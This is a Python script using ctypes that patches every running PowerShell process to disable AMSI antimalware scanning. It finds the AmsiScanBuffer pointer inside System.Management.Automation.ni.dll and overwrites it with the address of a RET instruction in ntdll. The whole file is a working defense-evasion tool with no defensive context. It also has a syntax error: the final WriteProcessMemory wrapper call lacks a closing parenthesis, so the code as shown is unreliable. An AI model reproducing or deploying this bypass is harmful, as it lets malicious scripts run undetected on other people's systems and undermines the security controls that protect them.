from ctypes import *
from ctypes.wintypes import *
import struct
import psutil
import time
class MainSetup:
    #ProcessAccessRights directly from microsoft https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights 
    PROCC_ACCESS = 0x000F0000|0x00100000|0xFFFF
    #For the toolhelp32snapshot (RTFM!)
    TH32_FLAGS = 0x00000008
    #MODULEENTRY32 struct
    class MODULEENTRY32(Structure):
        MAX_MODULE_NAME32 = 255
        _fields_ = [
            ("dwSize",DWORD),
            ("th32ModuleID",DWORD),
            ("th32ProcessID",DWORD),
            ("GlblcntUsage",DWORD),
            ("ProccntUsage",DWORD),
            ("modBaseAddr",c_size_t),
            ("modBaseSize",DWORD),
            ("hModule",HMODULE),
            ("szModule",c_char * (MAX_MODULE_NAME32 + 1)),
            ("szExePath",c_char * MAX_PATH),

        ]

    #ret to look for in memory
    Ret = (
        b"\xC3"
    )
    
    #finding the addr of amsiscanbuffer to find the pointer
    RealAmsiScanBuffer = (
        b"\x48\x89\x5c\x24\x08"+
        b"\x48\x89\x6c\x24\x10"+
        b"\x48\x89\x74\x24\x18"+
        b"\x57"+
        b"\x41\x56"+
        b"\x41\x57"+
        b"\x48\x83\xec\x70"+
        b"\x4d\x8b\xf9"
    )

    #Define the main kernel and psapi
    KERNEL32 = windll.kernel32
    PSAPI = windll.psapi
    
    #Define all the Functions required
    #OpenProcess
    KERNEL32.OpenProcess.argtypes = (
        DWORD,
        BOOL,
        DWORD
    )
    KERNEL32.OpenProcess.restype = HANDLE

    #EnumProcessModules
    PSAPI.EnumProcessModules.argtypes = (
        HANDLE,
        POINTER(HMODULE),
        DWORD,
        LPDWORD
    )
    PSAPI.EnumProcessModules.restype = BOOL

    #GetModuleFileNameA
    KERNEL32.GetModuleFileNameA.argtypes = (
        HMODULE,
        LPSTR,
        DWORD
    )
    KERNEL32.GetModuleFileNameA.restype = DWORD

    #CreateToolhelp32Snapshot
    KERNEL32.CreateToolhelp32Snapshot.argtypes = (
        DWORD,
        DWORD
    )
    KERNEL32.CreateToolhelp32Snapshot.restype = HANDLE

    #Module32First
    KERNEL32.Module32First.argtypes = (
        HANDLE,
        POINTER(MODULEENTRY32)
    )
    KERNEL32.Module32First.restype = BOOL
    #Definethe ReadProcessMemory
        # Definición correcta para x64 usando una tupla y tipos de datos precisos
    KERNEL32.ReadProcessMemory.argtypes = (HANDLE, LPCVOID, LPVOID, c_size_t, POINTER(c_size_t))
    KERNEL32.ReadProcessMemory.restype = BOOL


    #WriteProcessMemory
    KERNEL32.WriteProcessMemory.argtypes = [HANDLE,LPVOID,LPCVOID,c_ulong,c_void_p]

#Search the whole system for pids and then see which ones of those are powershell, store them in a list
def getPowershellPids():
    ppids = [pid for pid in psutil.pids() if psutil.Process(pid).name() == 'powershell.exe']
    return ppids

#simple wrapper for WriteProcessMemory
def writetomem(handle,address,whattowrite):
    nBytes = c_int(0)
    write = MainSetup.KERNEL32.WriteProcessMemory(handle,address,whattowrite,len(whattowrite),byref(nBytes))
    if not write:
        print(f"[-] Error in write {MainSetup.KERNEL32.GetLastError()}")
    else:
        print("[+] Patch successfull")


#function to readfrommem to find be it the RET in ntdll or the vulnerable entry in system automation
def readfromMem(process_handle,base_address,buffertosearch):
    #create a text buffer with enough space for the buffer we are searching for
    lpBuffer = create_string_buffer(0x1000)
    #nBytes is set to NULL so it is ignored as a parameter but will complain if you dont set it
    nBytes = c_size_t(0)
    #Read memory and output in the create lpBuffer
    #return loop only when buffer is found
    while True:
        resultad = MainSetup.KERNEL32.ReadProcessMemory(process_handle,base_address,lpBuffer,sizeof(lpBuffer),byref(nBytes))
        #if the buffer is found in memory reuturn the address at which is it at
        if resultad:
            raw_mem = lpBuffer.raw[:nBytes.value]
            offset = raw_mem.find(buffertosearch)
            if offset != -1:
                print(f"[+] Found instruction in memory {hex(base_address+offset)}")
                return base_address+offset
        else:
            print(f"[-] Fin del módulo o página inaccesible alcanzada en: {hex(base_address)}. Deteniendo escaneo.")
            return None
        #reading in chunks to save so much fucking time
        base_address += (0x1000 - len(buffertosearch))

    
#find the handle of specified module
def find_module_handle(modulename,pid):
    #get the module handl from Toolhelp32Snapshot
    get_module_handle = MainSetup.KERNEL32.CreateToolhelp32Snapshot(MainSetup.TH32_FLAGS,pid)
    #error checking
    if not get_module_handle:
        print("[-] Error fetching module handle for process")
    #some setup for the MODULEENTRY32 struct
    me32 = MainSetup.MODULEENTRY32()
    #required param for moduleentry32
    me32.dwSize = sizeof(MainSetup.MODULEENTRY32) 
    #get the first module and increment the module until the needed one is found
    get_first_module = MainSetup.KERNEL32.Module32First(get_module_handle,byref(me32))
    while get_first_module:
        if modulename == "ntdll.dll":
             #if the module name matches, return the module address +0x1000 to not only make searching faster but in the case of ntdll its to not make it find the header
            if me32.szModule == bytes(modulename,encoding="utf8"):
                print(f"[+] Found {me32.szModule.decode()} with address {hex(me32.modBaseAddr)}")
                #close handle
                MainSetup.KERNEL32.CloseHandle(get_module_handle)
                #return address of the module +0x1000
                return me32.modBaseAddr+0x1000
            else:
                #if not found continue down the list until it is
                get_first_module = MainSetup.KERNEL32.Module32Next(get_module_handle,byref(me32))
        else:
            if me32.szModule == bytes(modulename,encoding="utf8"):
                print(f"[+] Found {me32.szModule.decode()} with address {hex(me32.modBaseAddr)}")
                #close handle
                MainSetup.KERNEL32.CloseHandle(get_module_handle)
                #return address of the module
                return me32.modBaseAddr
            else:
                #if not found continue down the list until it is
                get_first_module = MainSetup.KERNEL32.Module32Next(get_module_handle,byref(me32))
            
                   


#iterate through every pid found in system
for pidx in getPowershellPids():
    #Get the process handle for powershell
    process_handle = MainSetup.KERNEL32.OpenProcess(MainSetup.PROCC_ACCESS, False, pidx)
    #Error checking
    if not process_handle:
        print("[-] Error in proc handle")
    else:
        print(f"[+] Got handle to {pidx}")
    #Get handle to ntdll
    ntdll_handle = find_module_handle("ntdll.dll",pidx)

    #Find the ret in memory of ntdll.dll
    ret_instruction = readfromMem(process_handle=process_handle,base_address=ntdll_handle,buffertosearch=MainSetup.Ret)
    #Find Amsi
    amsi_scanbuffer_handle = find_module_handle("amsi.dll",pidx)
    #Find the address of AmsiScanBuffer to be able to identify the pointer
    find_amsiscanbuffer = readfromMem(process_handle=process_handle,base_address=amsi_scanbuffer_handle,buffertosearch=MainSetup.RealAmsiScanBuffer)
    #Turn the address into lil endian
    amsipointer_addr = struct.pack("<Q", find_amsiscanbuffer)
    #Get handle to System.Management
    System_management_handle = find_module_handle("System.Management.Automation.ni.dll",pidx)
    #Find the vulnerable mov instruction
    mov_instruction = readfromMem(process_handle=process_handle,base_address=System_management_handle,buffertosearch=amsipointer_addr)

    lil_ret = struct.pack("<Q", ret_instruction)
    #write the patch to memory
    writetomem(process_handle,mov_instruction,lil_ret
    #close handle
    MainSetup.KERNEL32.CloseHandle(process_handle)
    print("\n")
